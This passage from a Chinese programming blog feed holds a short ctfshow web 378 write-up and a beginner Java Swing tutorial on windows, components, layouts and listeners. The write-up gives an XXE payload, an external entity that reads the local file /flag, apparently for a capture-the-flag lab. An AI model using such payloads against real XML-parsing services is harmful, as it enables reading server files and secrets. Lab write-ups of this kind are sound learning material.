<h3 id="ctfshow-web-378"><a href="#ctfshow-web-378" class="headerlink" title="ctfshow web 378"></a>ctfshow web 378</h3><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了…..</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205445709.png" alt="image-20220110205445709"></p>
]]></content>
      <categories>
        <category>xxe</category>
      </categories>
      <tags>
        <tag>xxe</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>java_ui</title>
    <url>/2021/12/27/java-ui/</url>
    <content><![CDATA[<h4 id="JFrame"><a href="#JFrame" class="headerlink" title="JFrame"></a>JFrame</h4><p>JFrame初体验</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setSize(<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLocation(<span class="number">400</span>,<span class="number">300</span>);<span class="comment">//setLocation设置出现在屏幕中的位置</span></span><br><span class="line">        <span class="comment">//setBounds()可以一次性完成上面两句</span></span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);<span class="comment">//设置窗口可见</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<span class="comment">//设置点击关闭后关闭</span></span><br><span class="line">        <span class="comment">/*关闭方式参数</span></span><br><span class="line"><span class="comment">        DO_NOTHING_ON_CLOSE//什么也不做</span></span><br><span class="line"><span class="comment">        HIDE_ON_CLOSE//隐藏当前窗口</span></span><br><span class="line"><span class="comment">        DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</span></span><br><span class="line"><span class="comment">        EXIT_ON_CLOSE//结束窗口缩在的应用程序 ...一般选这个...</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211227233144855.png" alt="image-20211227233144855" style="zoom: 67%;" />

<h4 id="JDialog"><a href="#JDialog" class="headerlink" title="JDialog"></a>JDialog</h4><p>继承自java.awt.Dialog类,他是从一个窗体弹出来的另外一个窗体,他和JFrame类似</p>
<p><code>JDialog:可当成JFrame使用,但必须从属于JFrame</code></p>
<p>构造函数 <strong>一般用第三种</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JDialog();</span><br><span class="line">JDialog(Frame f);<span class="comment">//指定父窗口</span></span><br><span class="line">JDialog(Frame f,String title);<span class="comment">//指定父窗口+标题</span></span><br></pre></td></tr></table></figure>

<p>关闭方式只有三种,一般选第二种</p>
<p>DO_NOTHING_ON_CLOSE//什么也不做<br>HIDE_ON_CLOSE//隐藏当前窗口<br>DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setSize(<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        <span class="comment">//setLocation设置出现在屏幕中的位置</span></span><br><span class="line">        jf.setLocation(<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);<span class="comment">//设置窗口可见</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line"></span><br><span class="line">        JDialog jd=<span class="keyword">new</span> JDialog(jf,<span class="string">&quot;jdialog&quot;</span>);</span><br><span class="line">        jd.setBounds(<span class="number">500</span>,<span class="number">400</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        jd.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jd.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<img src="/images/java-ui/image-20211227234154224.png" alt="image-20211227234154224" style="zoom:67%;" />

<p>关闭JFrame所有窗口都会关闭,关闭JDialogJFrame不受影响</p>
<h4 id="组件和面板"><a href="#组件和面板" class="headerlink" title="组件和面板"></a>组件和面板</h4><p>例子</p>
<p>组件一般添加到Jpanel和JScrollPane再添加到JFrame</p>
<p>JScrollPane是带滚动条的面板,只能添加一个组件,添加多个组件可以先添加到Jpanel再添加到JScrollPane</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);<span class="comment">//设置窗口可见</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        JButton jb1=<span class="keyword">new</span> JButton(<span class="string">&quot;btn1&quot;</span>);</span><br><span class="line">        JButton jb2=<span class="keyword">new</span> JButton(<span class="string">&quot;btn2&quot;</span>);</span><br><span class="line">        JPanel jp=<span class="keyword">new</span> JPanel(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        jp.add(jb1);</span><br><span class="line">        jp.add(jb2);</span><br><span class="line">        jf.add(jp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211227235300734.png" alt="image-20211227235300734" style="zoom:67%;" />

<h5 id="标签组件JLabel"><a href="#标签组件JLabel" class="headerlink" title="标签组件JLabel"></a>标签组件JLabel</h5><p>和C#中的label一样,类似于只读的文本框</p>
<p>JLabel构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略</span><br><span class="line">JLabel(String str,Icon icon,<span class="keyword">int</span> aligment);<span class="comment">//设置文本,图标,水平对齐方式</span></span><br></pre></td></tr></table></figure>

<h5 id="按钮组件JButton"><a href="#按钮组件JButton" class="headerlink" title="按钮组件JButton"></a>按钮组件JButton</h5><p>JButton构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略</span><br><span class="line">JButton(String text,Icon icon)<span class="comment">//设置文本,图标</span></span><br></pre></td></tr></table></figure>

<p>其他JButton类内自带方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setTooltipText(String text)<span class="comment">//设置提示文本</span></span><br><span class="line">setBorderPainted();<span class="comment">//设置边界是否显示</span></span><br><span class="line">setEnabled();<span class="comment">//设置按钮知否可用</span></span><br></pre></td></tr></table></figure>

<h5 id="单选按钮组件JRadioButton"><a href="#单选按钮组件JRadioButton" class="headerlink" title="单选按钮组件JRadioButton"></a>单选按钮组件JRadioButton</h5><p>JRadioButton构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略,一般只用指定文字即可</span><br><span class="line">JRadioButton(String text,Icon icon,<span class="keyword">boolean</span> selected)<span class="comment">//指定文字,图标,是否选中</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JRadioButton jrb1=<span class="keyword">new</span> JRadioButton(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        JRadioButton jrb2=<span class="keyword">new</span> JRadioButton(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">        ButtonGroup group=<span class="keyword">new</span> ButtonGroup();</span><br><span class="line">        group.add(jrb1);</span><br><span class="line">        group.add(jrb2);</span><br><span class="line">        jf.add(jrb1);</span><br><span class="line">        jf.add(jrb2);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228001003287.png" alt="image-20211228001003287" style="zoom:67%;" />

<h5 id="复选框组件JCheckBox"><a href="#复选框组件JCheckBox" class="headerlink" title="复选框组件JCheckBox"></a>复选框组件JCheckBox</h5><p>JCheckBox构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JCheckBox(Icon icon,<span class="keyword">boolean</span> checked);<span class="comment">//指定图标,是否被选中</span></span><br><span class="line">JCheckBox(String text,<span class="keyword">boolean</span> checked);<span class="comment">//指定文字,是否被选中</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());<span class="comment">//设置流式布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JCheckBox jcb1=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;摆烂&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">        JCheckBox jcb2=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;足球&quot;</span>);</span><br><span class="line">        JCheckBox jcb3=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;音乐&quot;</span>);</span><br><span class="line">        JCheckBox jcb4=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;睡觉&quot;</span>);</span><br><span class="line">        jf.add(jcb1);</span><br><span class="line">        jf.add(jcb2);</span><br><span class="line">        jf.add(jcb3);</span><br><span class="line">        jf.add(jcb4);</span><br><span class="line">        </span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228001621601.png" alt="image-20211228001621601" style="zoom:67%;" />

<h5 id="下拉列表组件JComboBox"><a href="#下拉列表组件JComboBox" class="headerlink" title="下拉列表组件JComboBox"></a>下拉列表组件JComboBox</h5><p>JComboBox构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JComboBox();<span class="comment">//常用</span></span><br><span class="line">JComboBox(ComboBoxModel dataModel);<span class="comment">//使用listModel建立一个下拉列表</span></span><br><span class="line">JComBox(Object[] arrayData);</span><br><span class="line">JComboBox(Vector vector);</span><br></pre></td></tr></table></figure>

<p>方法</p>
<p><code>addItem添加下拉内容</code></p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());<span class="comment">//设置流式布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JComboBox box=<span class="keyword">new</span> JComboBox();</span><br><span class="line">        box.addItem(<span class="string">&quot;---请选择你的学历---&quot;</span>);</span><br><span class="line">        box.addItem(<span class="string">&quot;高中&quot;</span>);</span><br><span class="line">        box.addItem(<span class="string">&quot;大学&quot;</span>);</span><br><span class="line">        box.addItem(<span class="string">&quot;研究生&quot;</span>);</span><br><span class="line">        jf.add(box);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228131636660.png" alt="image-20211228131636660" style="zoom:67%;" />

<h5 id="菜单栏组件"><a href="#菜单栏组件" class="headerlink" title="菜单栏组件"></a>菜单栏组件</h5><p>JmenuBar  Jmenu  JmenuItem</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S9_3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jFrame=<span class="keyword">new</span> JFrame(<span class="string">&quot;记事本&quot;</span>);</span><br><span class="line">        jFrame.setBounds(<span class="number">500</span>,<span class="number">400</span>,<span class="number">700</span>,<span class="number">700</span>);</span><br><span class="line">        jFrame.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.LEFT));</span><br><span class="line">        JMenuBar bar=<span class="keyword">new</span> JMenuBar();</span><br><span class="line">        JMenu menu1=<span class="keyword">new</span> JMenu(<span class="string">&quot;文件(F)&quot;</span>);</span><br><span class="line">        JMenuItem item1=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;新建&quot;</span>);</span><br><span class="line">        JMenuItem item2=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;保存&quot;</span>);</span><br><span class="line">        JMenuItem item3=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;另存为&quot;</span>);</span><br><span class="line">        menu1.add(item1);</span><br><span class="line">        menu1.add(item2);</span><br><span class="line">        menu1.add(item3);</span><br><span class="line">        JMenu menu2=<span class="keyword">new</span> JMenu(<span class="string">&quot;编辑(E)&quot;</span>);</span><br><span class="line">        JMenu menu3=<span class="keyword">new</span> JMenu(<span class="string">&quot;格式(O)&quot;</span>);</span><br><span class="line">        JMenu menu4=<span class="keyword">new</span> JMenu(<span class="string">&quot;查看(V)&quot;</span>);</span><br><span class="line">        JMenu menu5=<span class="keyword">new</span> JMenu(<span class="string">&quot;帮助(H)&quot;</span>);</span><br><span class="line">        JMenuItem item4=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;查看帮助(H)&quot;</span>);</span><br><span class="line">        JMenuItem item5=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;发送反馈(F)&quot;</span>);</span><br><span class="line">        JMenuItem item6=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;关于记事本(A)&quot;</span>);</span><br><span class="line">        menu5.add(item4);</span><br><span class="line">        menu5.add(item5);</span><br><span class="line">        menu5.add(item6);</span><br><span class="line">        bar.add(menu1);</span><br><span class="line">        bar.add(menu2);</span><br><span class="line">        bar.add(menu3);</span><br><span class="line">        bar.add(menu4);</span><br><span class="line">        bar.add(menu5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        jFrame.add(bar);</span><br><span class="line">        JTextArea jTextArea=<span class="keyword">new</span> JTextArea(<span class="number">40</span>,<span class="number">63</span>);</span><br><span class="line">        jFrame.add(jTextArea);</span><br><span class="line">        jFrame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211229002557142.png" alt="image-20211229002557142" style="zoom:67%;" />

<h5 id="文本组件JTextField"><a href="#文本组件JTextField" class="headerlink" title="文本组件JTextField"></a>文本组件JTextField</h5><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略,一般只用指定文字即可</span><br><span class="line">JTextField(Document docModel,String text,<span class="keyword">int</span> fieldWidth);<span class="comment">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>

<p><code>getText();//获取输入的内容</code></p>
<h5 id="密码框组件JPasswordField"><a href="#密码框组件JPasswordField" class="headerlink" title="密码框组件JPasswordField"></a>密码框组件JPasswordField</h5><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略,一般只用指定文字即可</span><br><span class="line">JPasswordField(Document docModel,String text,<span class="keyword">int</span> fieldWidth);<span class="comment">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>

<p>常用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setEchoChar(<span class="string">&#x27;*&#x27;</span>);<span class="comment">//设置回显字符</span></span><br><span class="line">getText();<span class="comment">//获取输入的内容</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.LEFT));<span class="comment">//设置流式布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JLabel jlabel1=<span class="keyword">new</span> JLabel(<span class="string">&quot;账号:&quot;</span>);</span><br><span class="line">        JTextField username=<span class="keyword">new</span> JTextField(<span class="number">10</span>);</span><br><span class="line">        jf.add(jlabel1);</span><br><span class="line">        jf.add(username);</span><br><span class="line">        JLabel jlabel2=<span class="keyword">new</span> JLabel(<span class="string">&quot;密码:&quot;</span>);</span><br><span class="line">        JPasswordField password=<span class="keyword">new</span> JPasswordField(<span class="number">10</span>);</span><br><span class="line">        password.setEchoChar(<span class="string">&#x27;*&#x27;</span>);<span class="comment">//设置回显字符</span></span><br><span class="line"></span><br><span class="line">        jf.add(jlabel2);</span><br><span class="line"></span><br><span class="line">        jf.add(password);</span><br><span class="line"></span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228133823317.png" alt="image-20211228133823317" style="zoom:67%;" />

<h5 id="文本域组件JTextArea"><a href="#文本域组件JTextArea" class="headerlink" title="文本域组件JTextArea"></a>文本域组件JTextArea</h5><p>构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JTextArea(Document doc,String text,<span class="keyword">int</span> rows,<span class="keyword">int</span> cols);<span class="comment">//指定文本模型,默认文字,长,宽</span></span><br></pre></td></tr></table></figure>

<p>常用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setLineWrap();<span class="comment">//设置文本域是否自动换行true or false</span></span><br><span class="line">getText();<span class="comment">//获取输入的内容</span></span><br></pre></td></tr></table></figure>

<h4 id="常用布局"><a href="#常用布局" class="headerlink" title="常用布局"></a>常用布局</h4><h5 id="流布局FlowLayout"><a href="#流布局FlowLayout" class="headerlink" title="流布局FlowLayout"></a>流布局FlowLayout</h5><p>所有组件像流一样,一个一个排放,排满一行之后排下一行,默认情况下,每个组件是居中排列的,但是也可以设置</p>
<p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数都可省略,一般只写对齐方式</span></span><br><span class="line">FlowLayout(<span class="keyword">int</span> aligment,<span class="keyword">int</span> horizGap,<span class="keyword">int</span> vertGap);<span class="comment">//设置对齐方式,上下偏移</span></span><br><span class="line">aligment取值:</span><br><span class="line">FlowLayout.LEFT=<span class="number">0</span>;</span><br><span class="line">FlowLayout.CENTER=<span class="number">1</span>;</span><br><span class="line">FlowLayout.RIGHT=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<h5 id="边界布局BorderLayout"><a href="#边界布局BorderLayout" class="headerlink" title="边界布局BorderLayout"></a>边界布局BorderLayout</h5><p>边界布局是默认的布局管理方式,边界布局将容器分成了东<code>BorderLayout.NORTH</code>,南,西,北,中5个区域</p>
<p>在add的时候指定边界</p>
<p><code>jf.add(button,BorderLayout.NORTH);</code></p>
<img src="/images/java-ui/image-20211228135034235.png" alt="image-20211228135034235" style="zoom:67%;" />

<h5 id="网格布局GridLayout"><a href="#网格布局GridLayout" class="headerlink" title="网格布局GridLayout"></a>网格布局GridLayout</h5><p>将容器划分为网格,网格个数由行和列决定,每个组件会填满空格,改变容器大小,组件的大小也会随之改变</p>
<p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GridLayout(<span class="keyword">int</span> rows,<span class="keyword">int</span> columns,<span class="keyword">int</span> horizGap,<span class="keyword">int</span> vertGap);<span class="comment">//指定行数,列数,水平间隔.垂直间隔</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>));<span class="comment">//设置网格布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;test&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JButton jButton1=<span class="keyword">new</span> JButton(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        JButton jButton2=<span class="keyword">new</span> JButton(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        JButton jButton3=<span class="keyword">new</span> JButton(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        JButton jButton4=<span class="keyword">new</span> JButton(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">        JButton jButton5=<span class="keyword">new</span> JButton(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">        JButton jButton6=<span class="keyword">new</span> JButton(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">        JButton jButton7=<span class="keyword">new</span> JButton(<span class="string">&quot;G&quot;</span>);</span><br><span class="line">        JButton jButton8=<span class="keyword">new</span> JButton(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">        jf.add(jButton1);</span><br><span class="line">        jf.add(jButton2);</span><br><span class="line">        jf.add(jButton3);</span><br><span class="line">        jf.add(jButton4);</span><br><span class="line">        jf.add(jButton5);</span><br><span class="line">        jf.add(jButton6);</span><br><span class="line">        jf.add(jButton7);</span><br><span class="line">        jf.add(jButton8);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228135556932.png" alt="image-20211228135556932" style="zoom:67%;" />

<h4 id="常用的事件监听器"><a href="#常用的事件监听器" class="headerlink" title="常用的事件监听器"></a>常用的事件监听器</h4><p>一个事件模型中有三个对象:事件源,事件,以及监听程序</p>
<h5 id="事件监听机制"><a href="#事件监听机制" class="headerlink" title="事件监听机制"></a>事件监听机制</h5><ul>
<li>事件源    事件发生的地方</li>
<li>事件        要发生的事情</li>
<li>事件处理 针对发生的事情做出的处理方案</li>
<li>事件监听 把事件源和事件关联起来</li>
</ul>
<h5 id="两种监听器"><a href="#两种监听器" class="headerlink" title="两种监听器"></a>两种监听器</h5><table>
<thead>
<tr>
<th></th>
<th>事件</th>
<th>事件源</th>
<th>监听接口</th>
<th>方法</th>
</tr>
</thead>
<tbody><tr>
<td>动作事件监听器</td>
<td>ActionEvent</td>
<td>JButton,JlistmJTextField等</td>
<td>ActionListener</td>
<td>addActionListener(),removeActionListener()</td>
</tr>
<tr>
<td>焦点事件监听器</td>
<td>FocusEvent</td>
<td>Component及其派生</td>
<td>FocusListener</td>
<td>addFocusListener(),removeFocusListener()</td>
</tr>
</tbody></table>
<p>使用步骤</p>
<ol>
<li>新建一个组件(如Button)</li>
<li>将该组件添加到相应的面板(如JFrame)</li>
<li>注册监听器以监听事件源产生的事件(如通过ActionListener来响应用户点击按钮)</li>
<li>定义处理事件的方法(如在ActionListener中的actionPerformed中定义响应的方法)</li>
</ol>
<p><strong>一般用匿名内部类方式实现</strong></p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jla.addFocusListener(<span class="keyword">new</span> FocusListener()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">focusLost</span><span class="params">(FocusEvent e)</span></span>&#123;</span><br><span class="line">        <span class="comment">//失去焦点的时候做的事情</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">focusGained</span><span class="params">(FocusEvent e)</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取焦点的时候做的事情</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

